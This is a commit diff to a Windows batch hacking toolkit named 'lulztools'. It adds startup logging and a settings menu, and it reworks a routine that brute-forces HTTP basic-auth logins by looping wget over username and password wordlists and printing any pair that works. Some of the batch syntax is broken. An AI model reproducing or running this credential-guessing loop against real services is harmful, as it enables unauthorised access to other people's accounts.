Update main.bat
I worked on the brute forcer and finished the settings, also started working on the startup.log thingy.

+++ main.bat
@@ -1,5 +1,35 @@
+@echo off
 set version = Beta 0.1
 set branch = Master
+echo lulztools/main.bat> Calling configuration...
+call save.bat
+color %color%
+set runtimes = %runtimes%+1
+echo lulztools/main.bat> Saving startup to log
+set hour=%time:~0,2%
+if "%hour:~0,1%" == " " set hour=0%hour:~1,1%
+echo hour=%hour%
+set min=%time:~3,2%
+if "%min:~0,1%" == " " set min=0%min:~1,1%
+echo min=%min%
+set secs=%time:~6,2%
+if "%secs:~0,1%" == " " set secs=0%secs:~1,1%
+echo secs=%secs%
+set year=%date:~-4%
+echo year=%year%
+set month=%date:~3,2%
+if "%month:~0,1%" == " " set month=0%month:~1,1%
+echo month=%month%
+set day=%date:~0,2%
+if "%day:~0,1%" == " " set day=0%day:~1,1%
+echo day=%day%
+set datetimef=%year%%month%%day%_%hour%%min%%secs%
+echo [BEGIN STARTUP MESSAGE] >> startup.log
+echo Startup nr. %runtimes% >> startup.log
+echo Started up at %datetimef% >> startup.log
+echo Version using: %version% >> startup.log
+echo Branch using: %branch% >> startup.log
+echo [END STARTUP MESSAGE] >> startup.log
 cls
 echo  __       __    __   __       ________  .___________.  ______     ______    __          _______.
 echo |  |     |  |  |  | |  |     |       /  |           | /  __  \   /  __  \  |  |        /       |
@@ -397,6 +427,9 @@ echo | Colours:                                                              |
 echo | [C1] Enter Colour                                                     |
 echo | [C2] Colour Help                                                      |
 echo |                                                                       |
+echo | Startup list:                                                         |
+echo | [S1] Reset startup list                                               |
+echo |                                                                       |
 echo | [E] Go back to Main Menu                                              |
 echo +=======================================================================+
 set /p option=lulztools/main.bat:system_conf> 
@@ -406,6 +439,9 @@ if %option% == C1 do (
 	if %ERRORLEVEL% == 1 do (
 		goto system_conf
 	)
+	rm save.bat
+	echo @echo off >> save.bat
+	echo set color = %color% >> save.bat
 )
 if %option% == c1 do (
 	set /p color=lulztools/main.bat:system_conf> Colour:
@@ -426,8 +462,10 @@ if %option% == c2 do (
 	pause >nul
 	goto system_conf
 )
-if %option% == e goto end
-if %option% == E goto end
+if %option% == s1 do (
+	rm startup.log
+	goto system_conf
+)
 goto system_conf
 
 :brute_force
@@ -449,18 +487,19 @@ set LIST2=%5
 echo lulztools/main.bat:#h_brute-force> Cracking...
 
 if %TYPE% == wget (
-FOR /F "skip=1 eol=> tokens=1 delims=" %%a IN (%LIST1%) DO (
-	FOR /F "skip=1 eol=> tokens=1 delims=" %%b IN (%LIST2%) DO (
-		echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
-		if %TYPE% == wget (
+	FOR /F "skip=1 eol=> tokens=1 delims=" %%a IN (%LIST1%) DO (
+		FOR /F "skip=1 eol=> tokens=1 delims=" %%b IN (%LIST2%) DO (
 			echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
-			wget --http-user=%%a --http-passwd=%%b --quiet %INFO%
-			if %ERRORLEVEL% == 0 (
-				echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
-				echo lulztools/main.bat:#h_brute-force> Used: %%a:%%b
-				echo lulztools/main.bat:#h_brute-force> It is best to copy down the login data now
-				pause >nul
-				goto end
+			if %TYPE% == wget (
+				echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
+				wget --http-user=%%a --http-passwd=%%b --quiet %INFO%
+				if %ERRORLEVEL% == 0 (
+					echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
+					echo lulztools/main.bat:#h_brute-force> Used: %%a:%%b
+					echo lulztools/main.bat:#h_brute-force> It is best to copy down the login data now
+					pause >nul
+					goto end
+				)
 			)
 		)
 	)
@@ -478,6 +517,12 @@ if %TYPE% == aes (
 		)
 	)
 )
+
+if %TYPE% == curl_send (
+	echo lulztools/main.bat:#h_brute-force> I am still working on this function :)
+	goto end
+)
+
 echo lulztools/main.bat:#h_brute-force> Command not found
 
 :end
